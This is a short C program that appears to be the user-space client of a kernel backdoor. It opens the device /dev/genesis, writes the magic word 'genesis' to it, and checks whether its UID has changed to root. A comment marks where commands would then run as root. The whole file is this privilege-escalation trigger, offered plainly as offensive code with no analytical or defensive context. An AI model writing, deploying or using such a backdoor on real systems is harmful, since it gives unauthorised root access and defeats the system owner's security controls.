#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/fcntl.h>

#define GENESIS_DEV "/dev/genesis"

int main(int argc, char **argv) {

    int uid;
    int fd;

    uid = getuid();
    printf("UID before sending the magic word: %d\n", uid);

    fd = open(GENESIS_DEV, O_RDWR);

    if(fd < 0) {
        printf("Cannot open device %s\n", GENESIS_DEV);
        return -1;
    }

    write(fd, "genesis", 7);

    uid = getuid();
    printf("UID after sending the magic word: %d\n", uid);

    // Here you execute stuff as root
    
    close(fd);
    
    return 0;
}
